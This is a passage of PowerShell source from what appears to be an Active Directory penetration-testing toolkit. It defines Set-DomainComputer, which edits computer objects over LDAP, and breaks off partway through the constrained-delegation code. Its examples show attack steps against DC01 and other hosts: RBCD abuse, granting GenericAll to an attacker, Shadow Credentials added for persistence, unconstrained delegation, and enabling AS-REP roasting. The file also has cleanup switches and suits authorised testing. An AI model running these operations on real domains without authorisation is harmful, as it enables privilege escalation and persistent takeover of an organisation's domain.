function Set-DomainComputer {
<#
.SYNOPSIS
    Modifies computer objects in Active Directory.

.DESCRIPTION
    Set-DomainComputer is a flexible helper function for creating and modifying computer objects in AD.
    It supports various operations via parameter sets:    - RBCD configuration (Resource-Based Constrained Delegation)
    - Owner modification (requires TakeOwnership permission)
    - ACL modification (requires WriteDacl permission)
    - Shadow Credentials (adds/removes Key Credentials for PKINIT authentication)
    - UAC Flag Manipulation (PasswordNotRequired, PasswordNeverExpires, NotDelegated, DontReqPreauth)

.PARAMETER Identity
    sAMAccountName, DistinguishedName, SID or DOMAIN\computer format (for modifying existing computers).

.PARAMETER AddRBCD
    Computer/User account to allow delegation FROM (for RBCD).
    This principal will be allowed to impersonate users TO the target computer.
    Sets msDS-AllowedToActOnBehalfOfOtherIdentity on the target.

.PARAMETER ClearRBCD
    Removes RBCD configuration (clears msDS-AllowedToActOnBehalfOfOtherIdentity).
    If multiple principals are configured, use -Principal to remove a specific one.
    Use -Force to remove all principals at once.

.PARAMETER Owner
    New owner for the computer object (DOMAIN\user or DN format).

.PARAMETER GrantRights
    Rights to grant to a principal. Values: GenericAll, GenericWrite, WriteDacl, WriteOwner.

.PARAMETER Principal
    Principal for ACL or RBCD operations.
    With -GrantRights: Principal to grant rights to (required).
    With -ClearRBCD: Specific principal to remove from RBCD (optional, lists entries if not specified).

.PARAMETER Domain
    Target domain.

.PARAMETER Server
    Specific Domain Controller.

.PARAMETER Credential
    PSCredential object for authentication.

.PARAMETER AddShadowCredential
    Adds a Shadow Credential (Key Credential) to the computer object for PKINIT authentication.
    Generates an RSA key pair and adds the public key to msDS-KeyCredentialLink.
    Returns the private key for use with tools like Rubeus.

.PARAMETER ClearShadowCredentials
    Removes all Shadow Credentials from the computer object.

.PARAMETER DeviceID
    Device GUID for Shadow Credential operations.
    With -AddShadowCredential: Optional custom Device ID (random GUID if not specified).
    With -ClearShadowCredentials: Specific DeviceID to remove (required if multiple credentials exist).

.PARAMETER NoPassword
    With -AddShadowCredential: Export the PFX certificate without password protection.

.PARAMETER Enable
    Enable a disabled computer account (remove ACCOUNTDISABLE flag from userAccountControl).

.PARAMETER Disable
    Disable a computer account (set ACCOUNTDISABLE flag in userAccountControl).

.PARAMETER SetTrustedForDelegation
    Enable Unconstrained Delegation (set TRUSTED_FOR_DELEGATION flag).
    WARNING: This is a high-impact change - the computer can impersonate ANY user to ANY service.

.PARAMETER ClearTrustedForDelegation
    Disable Unconstrained Delegation (remove TRUSTED_FOR_DELEGATION flag).
    Used for cleanup after testing.

.PARAMETER SetConstrainedDelegation
    Set the msDS-AllowedToDelegateTo attribute for classic Constrained Delegation.
    Accepts an array of SPNs that this computer can delegate to.
    Example: -SetConstrainedDelegation @("cifs/fileserver.contoso.com", "http/webserver.contoso.com")

.PARAMETER ClearConstrainedDelegation
    Clear the msDS-AllowedToDelegateTo attribute (remove all Constrained Delegation SPNs).
    Use -Principal to remove specific SPN(s), or -Force to remove all.

.PARAMETER SetTrustedToAuthForDelegation
    Enable Protocol Transition (S4U2Self) - set TRUSTED_TO_AUTH_FOR_DELEGATION flag.
    Allows the computer to obtain service tickets for users without their credentials.
    Required for Constrained Delegation with Protocol Transition.

.PARAMETER ClearTrustedToAuthForDelegation
    Disable Protocol Transition (remove TRUSTED_TO_AUTH_FOR_DELEGATION flag).
    Used for cleanup after testing.

.PARAMETER PasswordNotRequired
    Set the PASSWD_NOTREQD flag on a computer account (UAC 0x0020).
    Allows the computer account to have an empty password.

.PARAMETER ClearPasswordNotRequired
    Remove the PASSWD_NOTREQD flag from a computer account (UAC 0x0020).
    Requires a password again (cleanup).

.PARAMETER PasswordNeverExpires
    Set the DONT_EXPIRE_PASSWORD flag on a computer account (UAC 0x10000).
    Password will never expire regardless of domain policy.

.PARAMETER ClearPasswordNeverExpires
    Remove the DONT_EXPIRE_PASSWORD flag from a computer account (UAC 0x10000).
    Password expiry follows domain policy again (cleanup).

.PARAMETER NotDelegated
    Set the NOT_DELEGATED flag on a computer account (UAC 0x100000).
    Marks the account as sensitive and prevents delegation.

.PARAMETER ClearNotDelegated
    Remove the NOT_DELEGATED flag from a computer account (UAC 0x100000).
    Allows the account to be delegated again.

.PARAMETER DontReqPreauth
    Set the DONT_REQ_PREAUTH flag on a computer account (UAC 0x400000).
    Disables Kerberos pre-authentication, making the account AS-REP roastable.

.PARAMETER ClearDontReqPreauth
    Remove the DONT_REQ_PREAUTH flag from a computer account (UAC 0x400000).
    Re-enables Kerberos pre-authentication (cleanup).

.PARAMETER PassThru
    Returns a result object instead of only console output.
    Useful for scripting and automation.

.EXAMPLE
    Set-DomainComputer -Identity "DC01" -AddRBCD "EVILCOMPUTER$"
    Configures RBCD: EVILCOMPUTER$ can now impersonate users TO DC01.

.EXAMPLE
    Set-DomainComputer -Identity "FILESERVER01" -ClearRBCD
    Removes RBCD configuration from FILESERVER01 (if only one principal configured).

.EXAMPLE
    Set-DomainComputer -Identity "FILESERVER01" -ClearRBCD -Principal "EVILCOMPUTER$"
    Removes specific principal from RBCD configuration.

.EXAMPLE
    Set-DomainComputer -Identity "FILESERVER01" -ClearRBCD -Force
    Removes all principals from RBCD configuration.

.EXAMPLE
    Set-DomainComputer -Identity "WORKSTATION01" -Owner "DOMAIN\attacker"
    Takes ownership of computer object.

.EXAMPLE
    Set-DomainComputer -Identity "DC01" -GrantRights GenericAll -Principal "DOMAIN\attacker"
    Grants GenericAll rights to attacker on DC01 computer object.

.EXAMPLE
    Set-DomainComputer -Identity "DC01" -AddShadowCredential
    Adds Shadow Credential to DC01 for PKINIT authentication and persistence.

.EXAMPLE
    Set-DomainComputer -Identity "FILESERVER01" -ClearShadowCredentials
    Removes all Shadow Credentials from FILESERVER01.

.EXAMPLE
    Set-DomainComputer -Identity "COMPROMISED01" -Enable
    Enables a disabled computer account.

.EXAMPLE
    Set-DomainComputer -Identity "WORKSTATION01" -Disable
    Disables a computer account.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedForDelegation
    Enables Unconstrained Delegation on the computer (high-impact!).

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearTrustedForDelegation
    Disables Unconstrained Delegation (cleanup).

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -SetConstrainedDelegation @("cifs/dc01.contoso.com", "ldap/dc01.contoso.com")
    Configures Constrained Delegation to specific SPNs.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearConstrainedDelegation -Force
    Removes all Constrained Delegation SPNs.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -SetTrustedToAuthForDelegation
    Enables Protocol Transition (S4U2Self) for Constrained Delegation.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNotRequired
    Sets PASSWD_NOTREQD flag - computer account can have an empty password.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearPasswordNotRequired
    Removes the PASSWD_NOTREQD flag (cleanup).

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -PasswordNeverExpires
    Sets DONT_EXPIRE_PASSWORD flag for persistence.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearPasswordNeverExpires
    Removes the DONT_EXPIRE_PASSWORD flag (cleanup).

.EXAMPLE
    Set-DomainComputer -Identity "DC01" -NotDelegated
    Marks the computer as sensitive - prevents delegation (defensive).

.EXAMPLE
    Set-DomainComputer -Identity "DC01" -ClearNotDelegated
    Removes the NOT_DELEGATED protection (cleanup).

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -DontReqPreauth
    Disables Kerberos pre-authentication - enables AS-REP roasting on computer account.

.EXAMPLE
    Set-DomainComputer -Identity "YOURCOMPUTER$" -ClearDontReqPreauth
    Re-enables Kerberos pre-authentication (cleanup).

.OUTPUTS
    PSCustomObject with operation result

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding(DefaultParameterSetName='SetRBCD')]
    param(
        # Identity for existing computers
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetRBCD')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearRBCD')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetOwner')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='GrantRights')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='AddShadowCredential')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearShadowCredentials')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='EnableAccount')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='DisableAccount')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetTrustedForDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearTrustedForDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetConstrainedDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearConstrainedDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetTrustedToAuthForDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearTrustedToAuthForDelegation')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordNotRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordNotRequired')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetPasswordNeverExpires')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearPasswordNeverExpires')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetNotDelegated')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearNotDelegated')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='SetDontReqPreauth')]
        [Parameter(Position=0, Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ClearDontReqPreauth')]
        [Alias('samAccountName', 'Computer', 'DNSHostName')]
        [string]$Identity,

        # RBCD configuration
        [Parameter(ParameterSetName='SetRBCD', Mandatory=$true)]
        [string]$AddRBCD,

        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$true)]
        [switch]$ClearRBCD,

        # Owner modification
        [Parameter(ParameterSetName='SetOwner', Mandatory=$true)]
        [string]$Owner,

        # ACL modification
        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [ValidateSet('GenericAll','GenericWrite','WriteDacl','WriteOwner')]
        [string]$GrantRights,

        [Parameter(ParameterSetName='GrantRights', Mandatory=$true)]
        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$false)]
        [string]$Principal,

        # Shadow Credentials
        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$true)]
        [switch]$AddShadowCredential,

        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$true)]
        [switch]$ClearShadowCredentials,

        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$false)]
        [Alias('RemoveDeviceID', 'TargetDeviceID')]
        [string]$DeviceID,

        [Parameter(ParameterSetName='AddShadowCredential', Mandatory=$false)]
        [switch]$NoPassword,

        [Parameter(ParameterSetName='ClearRBCD', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearShadowCredentials', Mandatory=$false)]
        [Parameter(ParameterSetName='ClearConstrainedDelegation', Mandatory=$false)]
        [switch]$Force,

        # Account State Management
        [Parameter(ParameterSetName='EnableAccount', Mandatory=$true)]
        [switch]$Enable,

        [Parameter(ParameterSetName='DisableAccount', Mandatory=$true)]
        [switch]$Disable,

        # Unconstrained Delegation (TRUSTED_FOR_DELEGATION)
        [Parameter(ParameterSetName='SetTrustedForDelegation', Mandatory=$true)]
        [switch]$SetTrustedForDelegation,

        [Parameter(ParameterSetName='ClearTrustedForDelegation', Mandatory=$true)]
        [switch]$ClearTrustedForDelegation,

        # Constrained Delegation (msDS-AllowedToDelegateTo)
        [Parameter(ParameterSetName='SetConstrainedDelegation', Mandatory=$true)]
        [string[]]$SetConstrainedDelegation,

        [Parameter(ParameterSetName='ClearConstrainedDelegation', Mandatory=$true)]
        [switch]$ClearConstrainedDelegation,

        # Protocol Transition (TRUSTED_TO_AUTH_FOR_DELEGATION / S4U2Self)
        [Parameter(ParameterSetName='SetTrustedToAuthForDelegation', Mandatory=$true)]
        [switch]$SetTrustedToAuthForDelegation,

        [Parameter(ParameterSetName='ClearTrustedToAuthForDelegation', Mandatory=$true)]
        [switch]$ClearTrustedToAuthForDelegation,

        # UAC Flag: PASSWD_NOTREQD (0x0020)
        [Parameter(ParameterSetName='SetPasswordNotRequired', Mandatory=$true)]
        [switch]$PasswordNotRequired,

        [Parameter(ParameterSetName='ClearPasswordNotRequired', Mandatory=$true)]
        [switch]$ClearPasswordNotRequired,

        # UAC Flag: DONT_EXPIRE_PASSWORD (0x10000)
        [Parameter(ParameterSetName='SetPasswordNeverExpires', Mandatory=$true)]
        [switch]$PasswordNeverExpires,

        [Parameter(ParameterSetName='ClearPasswordNeverExpires', Mandatory=$true)]
        [switch]$ClearPasswordNeverExpires,

        # UAC Flag: NOT_DELEGATED (0x100000)
        [Parameter(ParameterSetName='SetNotDelegated', Mandatory=$true)]
        [switch]$NotDelegated,

        # UAC Flag: NOT_DELEGATED - Clear (0x100000)
        [Parameter(ParameterSetName='ClearNotDelegated', Mandatory=$true)]
        [switch]$ClearNotDelegated,

        # UAC Flag: DONT_REQ_PREAUTH (0x400000)
        [Parameter(ParameterSetName='SetDontReqPreauth', Mandatory=$true)]
        [switch]$DontReqPreauth,

        # UAC Flag: DONT_REQ_PREAUTH - Clear (0x400000)
        [Parameter(ParameterSetName='ClearDontReqPreauth', Mandatory=$true)]
        [switch]$ClearDontReqPreauth,

        # Authentication parameters
        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [switch]$PassThru,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    begin {
        Write-Log "[Set-DomainComputer] Starting computer operation: $Identity (ParameterSet: $($PSCmdlet.ParameterSetName))"
    }

    process {
        # Ensure LDAP connection at start of process block
        $ConnectionParams = @{}
        if ($Domain) { $ConnectionParams['Domain'] = $Domain }
        if ($Server) { $ConnectionParams['Server'] = $Server }
        if ($Credential) { $ConnectionParams['Credential'] = $Credential }

        if (-not (Ensure-LDAPConnection @ConnectionParams)) {
            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = $PSCmdlet.ParameterSetName
                    Computer = $Identity
                    Success = $false
                    Message = "No LDAP connection available"
                }
            }
            return
        }

        try {
            # Find the target computer
            Write-Log "[Set-DomainComputer] Searching for computer: $Identity"
            $TargetComputer = @(Get-DomainComputer -Identity $Identity @ConnectionParams)[0]

            if (-not $TargetComputer) {
                throw "Computer '$Identity' not Found"
            }

            $ComputerDN = $TargetComputer.distinguishedName
            Write-Log "[Set-DomainComputer] Found computer: $ComputerDN"

            # Step 3: Perform operation based on ParameterSet
            switch ($PSCmdlet.ParameterSetName) {
                'SetRBCD' {
                    $result = Invoke-RBCDOperation -TargetDN $ComputerDN -TargetSAMAccountName $TargetComputer.sAMAccountName -TargetType 'Computer' -AddRBCD $AddRBCD -PassThru:$PassThru -ConnectionParams $ConnectionParams

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'ClearRBCD' {
                    $result = Invoke-RBCDOperation -TargetDN $ComputerDN -TargetSAMAccountName $TargetComputer.sAMAccountName -TargetType 'Computer' -ClearRBCD -Principal $Principal -Force:$Force -PassThru:$PassThru -ConnectionParams $ConnectionParams

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'SetOwner' {
                    Write-Log "[Set-DomainComputer] Setting owner for: $($TargetComputer.sAMAccountName)"

                    try {
                        $Result = Set-DomainObject -Identity $ComputerDN -SetOwner -Principal $Owner @ConnectionParams

                        if ($Result) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetOwner"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    NewOwner = $Owner
                                    Success = $true
                                    Message = "Owner successfully changed"
                                }
                            } else {
                                Show-Line "Successfully changed owner of $($TargetComputer.sAMAccountName) to: $Owner" -Class Hint
                            }
                        } else {
                            throw "Set-DomainObject returned false"
                        }
                    } catch {
                        throw "Failed to set owner: $_"
                    }
                }

                'GrantRights' {
                    Write-Log "[Set-DomainComputer] Granting $GrantRights rights to $Principal on: $($TargetComputer.sAMAccountName)"

                    try {
                        $Result = Set-DomainObject -Identity $ComputerDN -GrantACE -Principal $Principal -Rights $GrantRights @ConnectionParams

                        if ($Result) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "GrantRights"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Principal = $Principal
                                    Rights = $GrantRights
                                    Success = $true
                                    Message = "Rights successfully granted"
                                }
                            } else {
                                Show-Line "Successfully granted $GrantRights to $Principal on: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        } else {
                            throw "Set-DomainObject returned false"
                        }
                    } catch {
                        throw "Failed to grant rights: $_"
                    }
                }

                'AddShadowCredential' {
                    # Determine UPN for certificate SAN (for computers: COMPUTERNAME$@REALM)
                    $ComputerUPN = "$($TargetComputer.sAMAccountName)@$($Script:LDAPContext.Domain.ToUpper())"

                    $result = Invoke-ShadowCredentialOperation -TargetDN $ComputerDN -TargetSAMAccountName $TargetComputer.sAMAccountName -TargetType 'Computer' -TargetUPN $ComputerUPN -AddShadowCredential -DeviceID $DeviceID -NoPassword:$NoPassword -PassThru:$PassThru

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                'ClearShadowCredentials' {
                    $result = Invoke-ShadowCredentialOperation -TargetDN $ComputerDN -TargetSAMAccountName $TargetComputer.sAMAccountName -TargetType 'Computer' -ClearShadowCredentials -DeviceID $DeviceID -Force:$Force -PassThru:$PassThru

                    if ($PassThru -and $result) {
                        return $result
                    }
                }

                # ===== Account State Management =====
                'EnableAccount' {
                    Write-Log "[Set-DomainComputer] Enabling account: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }  # Default: WORKSTATION_TRUST_ACCOUNT

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # ACCOUNTDISABLE = 0x2
                        $ACCOUNTDISABLE = 0x2

                        if (($CurrentUAC -band $ACCOUNTDISABLE) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "EnableAccount"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Account already enabled (no change)"
                                }
                            } else {
                                Show-Line "Account already enabled: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $ACCOUNTDISABLE)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "EnableAccount"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Account enabled"
                                }
                            } else {
                                Show-Line "Successfully enabled account: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to enable account: $_"
                    }
                }

                'DisableAccount' {
                    Write-Log "[Set-DomainComputer] Disabling account: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # ACCOUNTDISABLE = 0x2
                        $ACCOUNTDISABLE = 0x2

                        if (($CurrentUAC -band $ACCOUNTDISABLE) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "DisableAccount"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Account already disabled (no change)"
                                }
                            } else {
                                Show-Line "Account already disabled: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $ACCOUNTDISABLE
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "DisableAccount"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Account disabled"
                                }
                            } else {
                                Show-Line "Successfully disabled account: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to disable account: $_"
                    }
                }

                # ===== Unconstrained Delegation (TRUSTED_FOR_DELEGATION) =====
                'SetTrustedForDelegation' {
                    Write-Log "[Set-DomainComputer] Enabling Unconstrained Delegation for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # TRUSTED_FOR_DELEGATION = 0x80000 (524288)
                        $TRUSTED_FOR_DELEGATION = 0x80000

                        if (($CurrentUAC -band $TRUSTED_FOR_DELEGATION) -ne 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetTrustedForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Unconstrained Delegation already enabled (no change)"
                                }
                            } else {
                                Show-Line "Unconstrained Delegation already enabled on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -bor $TRUSTED_FOR_DELEGATION
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetTrustedForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Unconstrained Delegation enabled - computer can now impersonate ANY user to ANY service!"
                                }
                            } else {
                                Show-Line "Successfully enabled Unconstrained Delegation for: $($TargetComputer.sAMAccountName)" -Class Hint
                                Show-Line "Computer can now impersonate ANY user to ANY service!" -Class Finding
                            }
                        }
                    } catch {
                        throw "Failed to enable Unconstrained Delegation: $_"
                    }
                }

                'ClearTrustedForDelegation' {
                    Write-Log "[Set-DomainComputer] Disabling Unconstrained Delegation for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current userAccountControl
                        $CurrentUAC = if ($TargetComputer.userAccountControl) {
                            [int]$TargetComputer.userAccountControl
                        } else { 4096 }

                        Write-Log "[Set-DomainComputer] Current userAccountControl: $CurrentUAC (0x$($CurrentUAC.ToString('X')))"

                        # TRUSTED_FOR_DELEGATION = 0x80000 (524288)
                        $TRUSTED_FOR_DELEGATION = 0x80000

                        if (($CurrentUAC -band $TRUSTED_FOR_DELEGATION) -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearTrustedForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "Unconstrained Delegation already disabled (no change)"
                                }
                            } else {
                                Show-Line "Unconstrained Delegation already disabled on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            $NewUAC = $CurrentUAC -band (-bnot $TRUSTED_FOR_DELEGATION)
                            Write-Log "[Set-DomainComputer] New userAccountControl: $NewUAC (0x$($NewUAC.ToString('X')))"

                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $ComputerDN

                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "userAccountControl"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add([string]$NewUAC) | Out-Null

                            $ModifyRequest.Modifications.Add($Modification) | Out-Null

                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }

                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "ClearTrustedForDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    OldUAC = $CurrentUAC
                                    NewUAC = $NewUAC
                                    Success = $true
                                    Message = "Unconstrained Delegation disabled"
                                }
                            } else {
                                Show-Line "Successfully disabled Unconstrained Delegation for: $($TargetComputer.sAMAccountName)" -Class Hint
                            }
                        }
                    } catch {
                        throw "Failed to disable Unconstrained Delegation: $_"
                    }
                }

                # ===== Constrained Delegation (msDS-AllowedToDelegateTo) =====
                'SetConstrainedDelegation' {
                    Write-Log "[Set-DomainComputer] Setting Constrained Delegation for: $($TargetComputer.sAMAccountName)"

                    try {
                        # Get current SPNs
                        $CurrentSPNs = @()
                        if ($TargetComputer.'msDS-AllowedToDelegateTo') {
                            $spnValue = $TargetComputer.'msDS-AllowedToDelegateTo'
                            if ($spnValue -is [System.Array]) {
                                $CurrentSPNs = @($spnValue | ForEach-Object { [string]$_ })
                            }
                            else {
                                $CurrentSPNs = @([string]$spnValue)
                            }
                        }

                        Write-Log "[Set-DomainComputer] Current msDS-AllowedToDelegateTo ($($CurrentSPNs.Count)): $($CurrentSPNs -join ', ')"

                        # Merge existing and new SPNs (avoid duplicates)
                        $NewSPNs = [string[]]@($CurrentSPNs)
                        $AddedSPNs = @()
                        foreach ($spn in $SetConstrainedDelegation) {
                            if ($NewSPNs -notcontains $spn) {
                                $NewSPNs += $spn
                                $AddedSPNs += $spn
                            }
                        }

                        if ($AddedSPNs.Count -eq 0) {
                            if ($PassThru) {
                                return [PSCustomObject]@{
                                    Operation = "SetConstrainedDelegation"
                                    Computer = $TargetComputer.sAMAccountName
                                    DistinguishedName = $ComputerDN
                                    Success = $true
                                    Message = "All SPNs already present (no change)"
                                    CurrentSPNs = $CurrentSPNs
                                }
                            } else {
                                Show-Line "All specified SPNs already present on: $($TargetComputer.sAMAccountName)" -Class Note
                            }
                        }
                        else {
                            Write-Log "[Set-DomainComputer] New msDS-AllowedToDelegateTo ($($NewSPNs.Count)): $($NewSPNs -join ', ')"

